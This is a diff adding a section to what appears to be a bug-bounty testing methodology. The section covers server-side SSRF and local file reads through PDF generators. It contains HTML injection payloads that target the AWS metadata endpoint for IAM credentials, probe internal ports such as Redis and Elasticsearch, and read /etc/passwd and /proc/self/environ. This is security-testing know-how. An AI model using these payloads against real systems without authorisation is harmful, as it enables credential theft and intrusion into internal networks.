@@ -973,6 +973,64 @@ Include PoCs demonstrating DNS rebinding bypass and internal port scanning for r
 
 ***
 
+#### PDF Generators <a href="#f2da" id="f2da"></a>
+
+{% stepper %}
+{% step %}
+Find any feature that generates a PDF from user-controlled HTML/content like&#x20;
+
+* Invoice download
+* Report export
+* Resume/CV builder → PDF
+* Ticket → PDF
+* Quote/Order → Download PDF
+* “Print this page” → Save as PDF
+* Contract preview → PDF
+{% endstep %}
+
+{% step %}
+Confirm the PDF is generated server-side rendered (not client-side jsPDF)
+{% endstep %}
+
+{% step %}
+If the PDF takes 2–10 seconds to generate → almost always server-side
+{% endstep %}
+
+{% step %}
+Inject the most basic SSRF / local file-read payload in any user-editable field
+
+```html
+<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
+```
+{% endstep %}
+
+{% step %}
+Generate the PDF and open it → if you see AWS metadata (iam/security-credentials/role-name) → instant Critical SSRF
+{% endstep %}
+
+{% step %}
+If the generator blocks external URLs but allows internal, try local ports
+
+```html
+<iframe src="http://127.0.0.1:22"></iframe>
+<iframe src="http://localhost:6379"></iframe>       <!-- Redis -->
+<iframe src="http://127.0.0.1:9200"></iframe>      <!-- Elasticsearch -->
+<iframe src="http://127.0.0.1:8080"></iframe>      <!-- Jenkins, Tomcat, etc. -->
+```
+{% endstep %}
+
+{% step %}
+For maximum impact – chain with file disclosure
+
+```html
+<link rel="stylesheet" href="file:///etc/passwd">
+<link rel="stylesheet" href="file:///proc/self/environ">
+```
+{% endstep %}
+{% endstepper %}
+
+***
+
 ### White Box
 
 ## Cheat Sheet
